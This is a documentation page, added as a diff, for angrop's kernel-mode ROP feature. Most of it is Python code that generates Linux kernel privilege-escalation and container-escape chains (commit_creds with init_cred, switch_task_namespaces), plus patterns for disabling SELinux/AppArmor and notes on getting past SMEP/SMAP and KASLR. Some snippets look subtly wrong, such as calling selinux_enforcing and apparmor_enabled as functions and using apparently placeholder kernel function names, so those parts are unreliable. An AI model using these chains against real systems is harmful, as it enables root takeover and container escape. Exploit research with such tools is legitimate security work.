@@ -1,0 +1,446 @@
+---
+title: Kernel ROP
+description: Exploit Linux kernel vulnerabilities using angrop's kernel-mode ROP chain generation
+---
+
+Angrop supports kernel-mode ROP for Linux kernel exploitation, allowing you to build privilege escalation chains and escape restricted environments. This guide demonstrates kernel ROP using a real-world example.
+
+## Kernel Mode Configuration
+
+To enable kernel-mode ROP analysis, use the `kernel_mode=True` parameter:
+
+```python
+import angr
+import angrop
+
+proj = angr.Project("./vmlinux_sym")
+rop = proj.analyses.ROP(
+    kernel_mode=True,
+    fast_mode=False,
+    only_check_near_rets=False,
+    max_block_size=12
+)
+```
+
+### Kernel-Specific Configuration
+
+- `kernel_mode=True` - Enable kernel-specific analysis
+- `fast_mode=False` - Don't skip complex gadgets (kernel has many)
+- `only_check_near_rets=False` - Search more thoroughly for gadgets
+- `max_block_size=12` - Allow longer gadgets common in kernel code
+
+<Note>
+Kernel ROP chains typically require a kernel image with symbols (`vmlinux` with debug symbols or `vmlinux_sym`). Without symbols, you'll need to manually identify function addresses.
+</Note>
+
+## Real-World Example: Linux Kernel Privilege Escalation
+
+This example from angrop's test suite (`examples/linux_escape_chain/solve.py`) demonstrates a complete kernel privilege escalation exploit:
+
+```python
+import os
+import time
+from multiprocessing import cpu_count
+import angr
+import angrop
+
+# Load Linux kernel binary
+proj = angr.Project("./vmlinux_sym")
+rop = proj.analyses.ROP(
+    fast_mode=False,
+    only_check_near_rets=False,
+    max_block_size=12,
+    kernel_mode=True
+)
+
+cpu_num = cpu_count()
+cache = "/tmp/linux_gadget_cache"
+
+# Find or load gadgets (this takes time for kernel binaries!)
+start = time.time()
+if os.path.exists(cache):
+    rop.load_gadgets(cache, optimize=False)
+else:
+    rop.find_gadgets(processes=cpu_num, optimize=False)
+    rop.save_gadgets(cache)
+print(f"Gadget finding time: {time.time() - start}s")
+
+# Optimize separately (also time-consuming)
+start = time.time()
+rop.optimize(processes=cpu_num)
+print(f"Graph optimization time: {time.time() - start}s")
+
+# Kernel symbol addresses (from /proc/kallsyms or vmlinux)
+init_cred = 0xffffffff8368b220
+init_nsproxy = 0xffffffff8368ad00
+
+# Build privilege escalation chain
+start = time.time()
+chain = rop.func_call("commit_creds", [init_cred]) + \
+        rop.func_call("find_task_by_vpid", [1]) + \
+        rop.move_regs(rdi='rax') + \
+        rop.set_regs(rsi=init_nsproxy, preserve_regs={'rdi'}) + \
+        rop.func_call("switch_task_namespaces", [], preserve_regs={'rdi', 'rsi'}) + \
+        rop.func_call('__x64_sys_fork', []) + \
+        rop.func_call('msleep', [0xffffffff])
+print(f"Chain generation time: {time.time() - start}s")
+
+chain.pp()
+chain.print_payload_code()
+```
+
+### Performance Characteristics
+
+From the example's documentation:
+
+```
+On a 16-core machine:
+- 404s to analyze the gadgets
+- 10s to optimize the graph  
+- 0.7s to generate the chain
+```
+
+<Tip>
+Kernel gadget finding is **very slow** for full kernel images. Always use gadget caching with `save_gadgets()` and `load_gadgets()`. Finding gadgets once and reusing the cache saves hours of computation.
+</Tip>
+
+## Understanding the Privilege Escalation Chain
+
+Let's break down each step of the kernel escape chain:
+
+<Steps>
+  <Step title="Escalate to root privileges">
+    ```python
+    rop.func_call("commit_creds", [init_cred])
+    ```
+    
+    The `commit_creds()` function installs new credentials. By passing `init_cred` (the kernel's init process credentials), we gain root privileges.
+    
+    **What it does:** Sets current process credentials to root (UID 0, GID 0, full capabilities)
+  </Step>
+
+  <Step title="Find the init process">
+    ```python
+    rop.func_call("find_task_by_vpid", [1])
+    ```
+    
+    Finds the `task_struct` for PID 1 (init process). Returns a pointer in `rax`.
+    
+    **Why:** The init process has full access to all namespaces, which we need for escaping containers.
+  </Step>
+
+  <Step title="Move task pointer to argument register">
+    ```python
+    rop.move_regs(rdi='rax')
+    ```
+    
+    Moves the task_struct pointer from `rax` (return value) to `rdi` (first argument).
+    
+    **Why:** We need this pointer as an argument to the next function call.
+  </Step>
+
+  <Step title="Set up namespace pointer">
+    ```python
+    rop.set_regs(rsi=init_nsproxy, preserve_regs={'rdi'})
+    ```
+    
+    Sets `rsi` to point to init's namespace proxy while preserving the task pointer in `rdi`.
+    
+    **Why:** `switch_task_namespaces()` needs both the task and the new namespace.
+  </Step>
+
+  <Step title="Switch to init's namespaces">
+    ```python
+    rop.func_call("switch_task_namespaces", [], preserve_regs={'rdi', 'rsi'})
+    ```
+    
+    Calls `switch_task_namespaces()` using the preserved register values as arguments.
+    
+    **Why:** Escapes container namespace isolation by adopting init's namespaces (network, mount, PID, etc.)
+  </Step>
+
+  <Step title="Fork to stabilize">
+    ```python
+    rop.func_call('__x64_sys_fork', [])
+    ```
+    
+    Creates a new process with our escalated privileges.
+    
+    **Why:** Forks before the exploit process dies, ensuring a privileged process survives.
+  </Step>
+
+  <Step title="Keep exploit alive">
+    ```python
+    rop.func_call('msleep', [0xffffffff])
+    ```
+    
+    Sleeps for a very long time (0xffffffff milliseconds ≈ 49 days).
+    
+    **Why:** Prevents the ROP chain from returning and potentially crashing. The forked process can be accessed separately.
+  </Step>
+</Steps>
+
+## Key Kernel ROP Techniques
+
+### 1. Calling Kernel Functions
+
+In kernel mode, you call kernel functions directly by name or address:
+
+```python
+# By symbol name (requires symbols in binary)
+chain = rop.func_call("commit_creds", [cred_ptr])
+
+# By address (works without symbols)
+chain = rop.func_call(0xffffffff8114d660, [cred_ptr])
+```
+
+### 2. Using Kernel Structures
+
+Kernel exploits often manipulate kernel data structures:
+
+```python
+# Addresses from /proc/kallsyms or kernel debug info
+init_cred = 0xffffffff8368b220        # struct cred *init_cred
+init_nsproxy = 0xffffffff8368ad00     # struct nsproxy *init_nsproxy  
+init_task = 0xffffffff8368a000        # struct task_struct init_task
+
+# Use them in your exploit
+chain = rop.func_call("commit_creds", [init_cred])
+```
+
+### 3. Preserving Registers Across Kernel Calls
+
+Kernel function calls often need to pass return values or maintain state:
+
+```python
+# Get task_struct pointer, use it in multiple calls
+chain = rop.func_call("current_task", [])
+chain += rop.move_regs(rbx='rax')  # Save to non-volatile register
+chain += rop.func_call("modify_task", [], preserve_regs={'rbx'})
+chain += rop.func_call("finalize_task", [], preserve_regs={'rbx'})
+```
+
+<Note>
+Kernel calling conventions are the same as userspace on x86_64: `rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`, then stack. However, some kernel-internal functions may use non-standard conventions.
+</Note>
+
+## Finding Kernel Symbol Addresses
+
+### Method 1: /proc/kallsyms (Live System)
+
+```bash
+# On the target system (requires root or kptr_restrict=0)
+$ sudo cat /proc/kallsyms | grep -E "commit_creds|init_cred"
+ffffffff8368b220 D init_cred
+ffffffff8114d660 T commit_creds
+```
+
+### Method 2: System.map
+
+```bash
+# From kernel build directory or /boot
+$ grep -E "commit_creds|init_cred" /boot/System.map-$(uname -r)
+ffffffff8368b220 D init_cred
+ffffffff8114d660 T commit_creds
+```
+
+### Method 3: Kernel Binary Symbols
+
+```python
+import angr
+
+proj = angr.Project("./vmlinux_sym")
+
+# Look up symbols
+commit_creds = proj.loader.find_symbol("commit_creds").rebased_addr
+init_cred = proj.loader.find_symbol("init_cred").rebased_addr
+
+print(f"commit_creds: {hex(commit_creds)}")
+print(f"init_cred: {hex(init_cred)}")
+```
+
+## Common Kernel Exploit Patterns
+
+### Pattern 1: Simple Privilege Escalation
+
+```python
+# Just get root
+init_cred = 0xffffffff8368b220
+chain = rop.func_call("commit_creds", [init_cred])
+chain += rop.func_call("__x64_sys_fork", [])
+```
+
+### Pattern 2: Namespace Escape
+
+```python
+# Escape container by switching namespaces
+init_nsproxy = 0xffffffff8368ad00
+chain = rop.func_call("find_task_by_vpid", [1])
+chain += rop.move_regs(rdi='rax')
+chain += rop.set_regs(rsi=init_nsproxy, preserve_regs={'rdi'})
+chain += rop.func_call("switch_task_namespaces", [], preserve_regs={'rdi', 'rsi'})
+```
+
+### Pattern 3: Disable Security Features
+
+```python
+# Disable SELinux/AppArmor
+chain = rop.func_call("selinux_enforcing", [0])  # Disable SELinux
+chain += rop.func_call("apparmor_enabled", [0])   # Disable AppArmor
+chain += rop.func_call("commit_creds", [init_cred])
+```
+
+### Pattern 4: Return to Userspace
+
+```python
+# After privilege escalation, return to userspace
+# This requires setting up iret frame or similar
+# (Complex - typically done with KPTI trampolines)
+```
+
+<Warning>
+Returning from kernel to userspace after ROP requires careful setup of CPU state (CS, SS, RFLAGS, RSP, RIP). Modern kernels with KPTI require using kernel page table trampolines. This is advanced and kernel-version specific.
+</Warning>
+
+## Kernel ROP Challenges
+
+### 1. SMEP/SMAP
+
+**Supervisor Mode Execution Prevention** and **Supervisor Mode Access Prevention** prevent the kernel from executing or accessing userspace memory.
+
+**Solutions:**
+- Use kernel-only ROP (no userspace gadgets)
+- Disable SMEP/SMAP via CR4 register manipulation
+- Use kernel gadgets exclusively
+
+```python
+# Angrop with kernel_mode=True automatically uses only kernel gadgets
+rop = proj.analyses.ROP(kernel_mode=True)
+```
+
+### 2. KASLR
+
+**Kernel Address Space Layout Randomization** randomizes kernel base address.
+
+**Solutions:**
+- Leak kernel addresses first
+- Use kernel pointer disclosures
+- Exploit `/proc/kallsyms` if available
+- Use relative offsets from leaked addresses
+
+### 3. Stack Canaries
+
+Kernel stack canaries protect against buffer overflows.
+
+**Solutions:**
+- Leak canary values
+- Bypass via other primitives (use-after-free, etc.)
+- Overwrite canary with correct value
+
+### 4. Limited Gadgets
+
+Kernel binaries may have fewer useful gadgets than userspace.
+
+**Solutions:**
+- Use `fast_mode=False` to find more gadgets
+- Increase `max_block_size` for longer gadget sequences
+- Use `only_check_near_rets=False` for thorough search
+
+## Performance Optimization
+
+### Gadget Finding
+
+```python
+import os
+from multiprocessing import cpu_count
+
+cache_file = "/tmp/vmlinux_gadgets.cache"
+
+if os.path.exists(cache_file):
+    # Load cached gadgets (seconds)
+    rop.load_gadgets(cache_file, optimize=False)
+else:
+    # Find gadgets (hours)
+    rop.find_gadgets(processes=cpu_count(), optimize=False)
+    rop.save_gadgets(cache_file)
+
+# Optimize separately
+rop.optimize(processes=cpu_count())
+```
+
+<Tip>
+**Kernel gadget finding tips:**
+- Use maximum CPU cores available
+- Cache gadgets - finding them takes hours for full kernels
+- Separate optimization from finding for better progress tracking
+- Consider using kernel modules instead of full kernel if possible
+</Tip>
+
+### Kernel Module ROP
+
+For faster development, analyze vulnerable kernel modules instead of the entire kernel:
+
+```python
+# Load just the vulnerable module
+proj = angr.Project("./vulnerable.ko")
+rop = proj.analyses.ROP(kernel_mode=True)
+rop.find_gadgets()  # Much faster than full kernel
+```
+
+## Best Practices
+
+1. **Always cache gadgets** - Kernel gadget finding is extremely slow
+2. **Use symbols when possible** - Much easier than raw addresses
+3. **Test incrementally** - Build and verify each stage of the exploit
+4. **Understand kernel internals** - Know what functions do before calling them
+5. **Check kernel version compatibility** - Offsets change between versions
+6. **Handle cleanup** - Fork or sleep to prevent crashes after ROP
+7. **Plan for KASLR** - Design exploits to work with leaked addresses
+
+## Debugging Kernel ROP Chains
+
+```python
+# Print detailed chain information
+chain.pp()
+
+# Generate exploit code
+chain.print_payload_code()
+
+# Check chain length
+print(f"Chain length: {len(chain)} bytes")
+print(f"Number of gadgets: {len(chain._gadgets)}")
+
+# Verify register preservation
+for i, gadget in enumerate(chain._gadgets):
+    print(f"Gadget {i}: changes {gadget.changed_regs}")
+```
+
+## Advanced: Custom Kernel Configurations
+
+```python
+# For specific kernel configurations
+rop = proj.analyses.ROP(
+    kernel_mode=True,
+    fast_mode=False,           # Find all gadgets
+    only_check_near_rets=False,  # Thorough search
+    max_block_size=20,         # Very long gadgets
+    stack_gsize=120,           # Allow larger stack changes
+    cond_br=True               # Include conditional branches
+)
+```
+
+<Note>
+Increasing `max_block_size`, `stack_gsize`, and enabling `cond_br` significantly increases gadget finding time but may discover more powerful gadgets.
+</Note>
+
+## Resources
+
+- Linux Kernel Source: https://github.com/torvalds/linux
+- Kernel Exploitation: https://github.com/xairy/linux-kernel-exploitation
+- /proc/kallsyms documentation: https://www.kernel.org/doc/Documentation/filesystems/proc.txt
+
+## Next Steps
+
+- [Syscalls](/guides/syscalls) - Understanding kernel syscall interface
+- [Function Calls](/guides/function-calls) - Techniques applicable to kernel functions
+- [Badbytes](/guides/badbytes) - Handling restricted characters in kernel exploits
